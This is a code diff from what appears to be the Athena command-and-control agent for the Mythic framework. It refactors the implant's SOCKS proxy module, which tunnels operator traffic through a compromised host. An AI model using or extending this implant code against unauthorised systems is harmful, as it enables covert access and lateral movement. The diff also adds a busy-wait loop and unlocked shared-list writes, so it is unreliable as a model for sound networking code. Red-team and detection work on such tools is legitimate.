@@ -2,11 +2,9 @@
 using Athena.Models.Athena.Socks;
 using Athena.Models.Mythic.Response;
 using Athena.Utilities;
-using GodSharp.Sockets;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -90,8 +88,7 @@ namespace Athena.Commands.Model
             List<SocksMessage> msgOut;
             msgOut = new List<SocksMessage>(this.messagesOut);
             this.messagesOut.Clear();
-            //msgOut.Reverse();
-            Debug.WriteLine($"[{DateTime.Now}] Returning: {msgOut.Count} messages");
+            msgOut.Reverse();
             return msgOut;
         }
 
@@ -107,20 +104,15 @@ namespace Athena.Commands.Model
                 return;
             }
 
-            if (!conn.IsConnectedOrConnecting())
+            while (conn.IsConnecting) { }; //packet arrived before it was finished connecting
+            if (!conn.IsConnected)
             {
                 await RemoveConnection(conn.server_id);
-
-                ReturnMessage(new SocksMessage()
-                {
-                    server_id = conn.server_id,
-                    data = "",
-                    exit = true
-                });
                 return;
             }
 
-            conn.client.Connection.Send(Misc.Base64DecodeToByteArray(sm.data));
+            conn.SendAsync(Misc.Base64DecodeToByteArray(sm.data));
+            conn.ReceiveAsync();
         }
 
         /// <summary>
@@ -139,21 +131,85 @@ namespace Athena.Commands.Model
 
                 ConnectionOptions co = new ConnectionOptions(sm); //Create new ConnectionOptions
 
-                if(co.ip is null || co.port == 0) //Couldn't resolve IP address
+                if(co.ip is null || co.port == 0)
                 {
-                    ReturnMessageFailure(co.server_id);
+                    lock (_lock)
+                    {
+                        this.messagesOut.Add(new SocksMessage
+                        {
+                            server_id = co.server_id,
+                            data = Misc.Base64Encode(new ConnectResponse
+                            {
+                                bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                                bndport = new byte[] { 0x00, 0x00 },
+                                addrtype = co.addressType,
+                                status = ConnectResponseStatus.GeneralFailure
+
+                            }.ToByte()).Result,
+                        });
+                    }
                     return;
                 }
 
-                AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object, and try to connect.
+                AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object
                 sc.HandleSocksEvent += ReturnSocksMessage;
 
                 await AddConnection(sc); //Add our connection to the Dictionary;
-                sc.client.Start();
+                Task.Run(async () =>
+                {
+                    try
+                    {
+                        sc.Connect();
+
+                        if (!sc.IsConnected)
+                        {
+                                this.messagesOut.Add(new SocksMessage
+                                {
+                                    server_id = sc.server_id,
+                                    data = Misc.Base64Encode(new ConnectResponse
+                                    {
+                                        bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                                        bndport = new byte[] { 0x00, 0x00 },
+                                        addrtype = co.addressType,
+                                        status = ConnectResponseStatus.GeneralFailure,
+
+                                    }.ToByte()).Result,
+                                    exit = true
+                                });
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        //Console.WriteLine(e.ToString());
+                        this.messagesOut.Add(new SocksMessage
+                            {
+                                server_id = sc.server_id,
+                                data = Misc.Base64Encode(new ConnectResponse
+                                {
+                                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                                    bndport = new byte[] { 0x00, 0x00 },
+                                    addrtype = co.addressType,
+                                    status = ConnectResponseStatus.GeneralFailure
+
+                                }.ToByte()).Result,
+                                exit = true,
+                            });
+                    }
+                });
             }
             catch (Exception e)
             {
-                ReturnMessageFailure(sm.server_id);
+                this.messagesOut.Add(new SocksMessage
+                {
+                    server_id = sm.server_id,
+                    exit = true,
+                    data = await Misc.Base64Encode(new ConnectResponse
+                    {
+                        bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                        bndport = new byte[] { 0x00, 0x00 },
+                        status = ConnectResponseStatus.GeneralFailure,
+                    }.ToByte())
+                });
             }
         }
 
@@ -164,22 +220,6 @@ namespace Athena.Commands.Model
         public void ReturnMessage(SocksMessage sm)
         {
             this.messagesOut.Add(sm);
-        }
-
-        public async void ReturnMessageFailure(int id)
-        {
-            ReturnMessage(new SocksMessage
-            {
-                server_id = id,
-                exit = true,
-                data = await Misc.Base64Encode(new ConnectResponse
-                {
-                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
-                    bndport = new byte[] { 0x00, 0x00 },
-                    status = ConnectResponseStatus.GeneralFailure,
-                }.ToByte())
-            });
-
         }
 
         private async void ReturnSocksMessage(object sender, SocksEventArgs e)
